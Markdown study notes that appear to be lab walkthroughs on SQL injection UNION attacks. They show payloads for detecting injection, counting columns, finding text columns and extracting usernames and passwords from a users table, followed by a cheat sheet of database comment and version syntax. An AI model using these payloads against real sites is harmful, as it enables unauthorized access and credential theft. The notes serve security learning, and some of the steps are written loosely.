### 1. SQL Injection UNION attack, determining the no of column

- __normal get request__
  - __`GET /filter?catergory=Gifts`__

- __check whether sql injection present or not__
  - __`GET /filter?catergory=Gifts'`__

- __Use UNION__
  - __`GET /filter?catergory=Gifts'+UNION+SELECT+NULL--`__
  - __If still is show the same error that means there is more than one column__
  - __Try to add more NULL__
  - __`GET /filter?catergory=Gifts'+UNION+SELECT+NULL,NULL,NULL--`__



### 2. SQL Injection UNION attak, finding a column containing text

- __normal get request__
  - __`GET /filter?catergory=Pets`__


- __check whether sql injection present or not__
  - __`GET /filter?catergory=Pets'`__


- __Use UNION__
  - __`GET /filter?catergory=Pets'+UNION+SELECT+NULL--`__
  - __If still is show the same error that means there is more than one column__
  - __Try to add more NULL__
  - __`GET /filter?catergory=Gifts'+UNION+SELECT+NULL,NULL,NULL--`__

- __Now you found there are three column__
  - __so now you need to find which of the column have string__
  - __`GET /filter?catergory=Gifts'+UNION+SELECT+'admin',NULL,NULL--`__
  - __If you are getting error then the column is not a string then go and test for the remaining colums__
  - > __Note: what string you are replacing by NULL the string definetly should be present in the column__


### 3. SQL Injection UNION Attack, retrieving multiple values in a single column

- __normal get request__
  - __`GET /filter?catergory=Pets`__


- __check whether sql injection present or not__
  - __`GET /filter?catergory=Pets'UNION+SELECT+NULL,NULL,username||'~'||password+FROM+users--`__








# Types of database

- __1. Oracle__
- __2. Microsft__
- __3. PostgreSQL__
- __4. MySQL__


### Database comments
- __1. Oracle      | --comment__
- __2. Microsft    | --comment or /*comment*/__
- __3. PostgreSQL  | --comment or /*comment*/__
- __4. MySQL       | #comment or -- comment or /*comment*/__


### Database version
- __1. Oracle      | SELECT banner FROM v$version or SELECT version FROM v$instance__
- __2. Microsft    | SELECT @@version__
- __3. PostgreSQL  | SELECT version()__
- __4. MySQL       | SELECT @@version__











